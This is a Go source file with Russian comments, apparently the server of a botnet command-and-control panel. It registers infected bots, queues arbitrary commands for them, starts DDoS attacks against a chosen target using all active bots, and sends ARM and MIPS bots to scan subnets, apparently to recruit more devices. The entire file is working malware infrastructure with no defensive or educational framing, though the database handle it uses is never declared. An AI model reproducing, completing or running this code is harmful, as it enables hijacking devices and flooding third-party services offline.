package main

import (
    "encoding/json"
    "fmt"
    "log"
    "net/http"
    "time"
    "strconv"
    "strings"
    "database/sql"
)

// Структуры
type Bot struct {
    IP           string    `json:"ip"`
    Arch         string    `json:"arch"`
    OS           string    `json:"os"`
    Uptime       int64     `json:"uptime"`
    Infected     int       `json:"infected"`
    LastSeen     time.Time `json:"last_seen"`
    IsActive     bool      `json:"is_active"`
}

type Command struct {
    ID        int       `json:"id"`
    BotIP     string    `json:"bot_ip"`
    Command   string    `json:"command"`
    Status    string    `json:"status"` // pending, executing, completed, failed
    Result    string    `json:"result"`
    CreatedAt time.Time `json:"created_at"`
}

type Attack struct {
    ID        int       `json:"id"`
    Target    string    `json:"target"`
    Method    string    `json:"method"`
    Duration  int       `json:"duration"`
    BotsCount int       `json:"bots_count"`
    Status    string    `json:"status"` // preparing, running, completed
    StartedAt time.Time `json:"started_at"`
}

// Обработчик подключения бота
func handleBotConnection(w http.ResponseWriter, r *http.Request) {
    var bot Bot
    err := json.NewDecoder(r.Body).Decode(&bot)
    if err != nil {
        http.Error(w, "Invalid request", http.StatusBadRequest)
        return
    }
    
    bot.LastSeen = time.Now()
    bot.IsActive = true
    
    // Сохраняем/обновляем в БД
    _, err = db.Exec(`
        INSERT OR REPLACE INTO bots 
        (ip, arch, os, uptime, infected, last_seen, is_active)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    `, bot.IP, bot.Arch, bot.OS, bot.Uptime, bot.Infected, bot.LastSeen, bot.IsActive)
    
    if err != nil {
        log.Printf("DB error: %v", err)
        http.Error(w, "Database error", http.StatusInternalServerError)
        return
    }
    
    // Проверяем команды для этого бота
    var pendingCmd Command
    err = db.QueryRow(`
        SELECT id, command FROM commands 
        WHERE bot_ip = ? AND status = 'pending'
        ORDER BY created_at DESC LIMIT 1
    `, bot.IP).Scan(&pendingCmd.ID, &pendingCmd.Command)
    
    response := map[string]interface{}{
        "status": "connected",
        "commands": []Command{},
    }
    
    if err == nil {
        // Есть команда для выполнения
        response["commands"] = []Command{pendingCmd}
        
        // Помечаем команду как выполняющуюся
        db.Exec("UPDATE commands SET status = 'executing' WHERE id = ?", pendingCmd.ID)
    }
    
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(response)
    
    log.Printf("[+] Bot connected: %s (%s)", bot.IP, bot.Arch)
}

// Обработчик результатов команды
func handleCommandResult(w http.ResponseWriter, r *http.Request) {
    var result struct {
        BotIP   string `json:"bot_ip"`
        Command string `json:"command"`
        Result  string `json:"result"`
        Success bool   `json:"success"`
    }
    
    err := json.NewDecoder(r.Body).Decode(&result)
    if err != nil {
        http.Error(w, "Invalid request", http.StatusBadRequest)
        return
    }
    
    // Обновляем статус команды
    status := "completed"
    if !result.Success {
        status = "failed"
    }
    
    _, err = db.Exec(`
        UPDATE commands 
        SET status = ?, result = ?
        WHERE bot_ip = ? AND command = ? AND status = 'executing'
    `, status, result.Result, result.BotIP, result.Command)
    
    if err != nil {
        log.Printf("DB error: %v", err)
    }
    
    w.WriteHeader(http.StatusOK)
    log.Printf("[+] Command result from %s: %s", result.BotIP, result.Result)
}

// API для веб-панели
func handleAPI(w http.ResponseWriter, r *http.Request) {
    action := r.URL.Query().Get("action")
    
    switch action {
    case "stats":
        handleStatsAPI(w, r)
    case "bots":
        handleBotsAPI(w, r)
    case "commands":
        handleCommandsAPI(w, r)
    case "attack":
        handleAttackAPI(w, r)
    case "scan":
        handleScanAPI(w, r)
    default:
        http.Error(w, "Unknown action", http.StatusBadRequest)
    }
}

// API статистики
func handleStatsAPI(w http.ResponseWriter, r *http.Request) {
    var totalBots, activeBots int
    var totalInfected sql.NullInt64
    
    db.QueryRow("SELECT COUNT(*) FROM bots").Scan(&totalBots)
    db.QueryRow("SELECT COUNT(*) FROM bots WHERE is_active = 1").Scan(&activeBots)
    db.QueryRow("SELECT SUM(infected) FROM bots").Scan(&totalInfected)
    
    stats := map[string]interface{}{
        "total_bots":   totalBots,
        "active_bots":  activeBots,
        "total_infected": totalInfected.Int64,
        "timestamp":    time.Now().Unix(),
    }
    
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(stats)
}

// API списка ботов
func handleBotsAPI(w http.ResponseWriter, r *http.Request) {
    rows, err := db.Query(`
        SELECT ip, arch, os, uptime, infected, last_seen, is_active
        FROM bots 
        ORDER BY last_seen DESC
    `)
    if err != nil {
        http.Error(w, "Database error", http.StatusInternalServerError)
        return
    }
    defer rows.Close()
    
    var bots []Bot
    for rows.Next() {
        var bot Bot
        err := rows.Scan(&bot.IP, &bot.Arch, &bot.OS, &bot.Uptime, 
                        &bot.Infected, &bot.LastSeen, &bot.IsActive)
        if err != nil {
            continue
        }
        bots = append(bots, bot)
    }
    
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(bots)
}

// API отправки команды
func handleCommandsAPI(w http.ResponseWriter, r *http.Request) {
    if r.Method != "POST" {
        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
        return
    }
    
    var req struct {
        Bots    []string `json:"bots"`
        Command string   `json:"command"`
    }
    
    err := json.NewDecoder(r.Body).Decode(&req)
    if err != nil {
        http.Error(w, "Invalid request", http.StatusBadRequest)
        return
    }
    
    // Добавляем команды для каждого бота
    sentCount := 0
    for _, botIP := range req.Bots {
        _, err := db.Exec(`
            INSERT INTO commands (bot_ip, command, status, created_at)
            VALUES (?, ?, 'pending', ?)
        `, botIP, req.Command, time.Now())
        
        if err == nil {
            sentCount++
        }
    }
    
    response := map[string]interface{}{
        "sent": sentCount,
        "total": len(req.Bots),
    }
    
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(response)
}

// API запуска DDoS атаки
func handleAttackAPI(w http.ResponseWriter, r *http.Request) {
    target := r.URL.Query().Get("target")
    method := r.URL.Query().Get("method")
    duration, _ := strconv.Atoi(r.URL.Query().Get("duration"))
    
    if target == "" || method == "" {
        http.Error(w, "Missing parameters", http.StatusBadRequest)
        return
    }
    
    // Получаем активных ботов
    rows, err := db.Query("SELECT ip FROM bots WHERE is_active = 1")
    if err != nil {
        http.Error(w, "Database error", http.StatusInternalServerError)
        return
    }
    defer rows.Close()
    
    var botIPs []string
    for rows.Next() {
        var ip string
        rows.Scan(&ip)
        botIPs = append(botIPs, ip)
    }
    
    // Создаем запись об атаке
    var attackID int64
    err = db.QueryRow(`
        INSERT INTO attacks (target, method, duration, bots_count, status, started_at)
        VALUES (?, ?, ?, ?, 'running', ?)
        RETURNING id
    `, target, method, duration, len(botIPs), time.Now()).Scan(&attackID)
    
    if err != nil {
        http.Error(w, "Failed to create attack", http.StatusInternalServerError)
        return
    }
    
    // Отправляем команду атаки всем ботам
    attackCmd := fmt.Sprintf("DDOS %s %s %d", method, target, duration)
    for _, botIP := range botIPs {
        db.Exec(`
            INSERT INTO commands (bot_ip, command, status, created_at)
            VALUES (?, ?, 'pending', ?)
        `, botIP, attackCmd, time.Now())
    }
    
    // Запускаем таймер завершения атаки
    go func() {
        time.Sleep(time.Duration(duration) * time.Second)
        db.Exec("UPDATE attacks SET status = 'completed' WHERE id = ?", attackID)
        
        // Отправляем команду остановки
        stopCmd := "STOP"
        for _, botIP := range botIPs {
            db.Exec(`
                INSERT INTO commands (bot_ip, command, status, created_at)
                VALUES (?, ?, 'pending', ?)
            `, botIP, stopCmd, time.Now())
        }
    }()
    
    response := map[string]interface{}{
        "attack_id": attackID,
        "bots_count": len(botIPs),
        "duration": duration,
        "status": "started",
    }
    
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(response)
}

// API сканирования сети
func handleScanAPI(w http.ResponseWriter, r *http.Request) {
    subnet := r.URL.Query().Get("subnet")
    if subnet == "" {
        http.Error(w, "Missing subnet", http.StatusBadRequest)
        return
    }
    
    // Получаем активных ботов
    rows, err := db.Query("SELECT ip FROM bots WHERE is_active = 1 AND arch IN ('arm', 'arm7', 'mips')")
    if err != nil {
        http.Error(w, "Database error", http.StatusInternalServerError)
        return
    }
    defer rows.Close()
    
    var botIPs []string
    for rows.Next() {
        var ip string
        rows.Scan(&ip)
        botIPs = append(botIPs, ip)
    }
    
    // Отправляем команду сканирования
    scanCmd := fmt.Sprintf("SCAN %s", subnet)
    sentCount := 0
    
    for _, botIP := range botIPs {
        // Выбираем только каждого 10-го бота для сканирования
        if sentCount < len(botIPs)/10 {
            db.Exec(`
                INSERT INTO commands (bot_ip, command, status, created_at)
                VALUES (?, ?, 'pending', ?)
            `, botIP, scanCmd, time.Now())
            sentCount++
        }
    }
    
    response := map[string]interface{}{
        "subnet": subnet,
        "scanners": sentCount,
        "status": "scan_started",
    }
    
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(response)
}

// Веб-сокеты для реального времени
func handleWebSocket(w http.ResponseWriter, r *http.Request) {
    // TODO: Implement WebSocket for real-time updates
    http.Error(w, "Not implemented", http.StatusNotImplemented)
}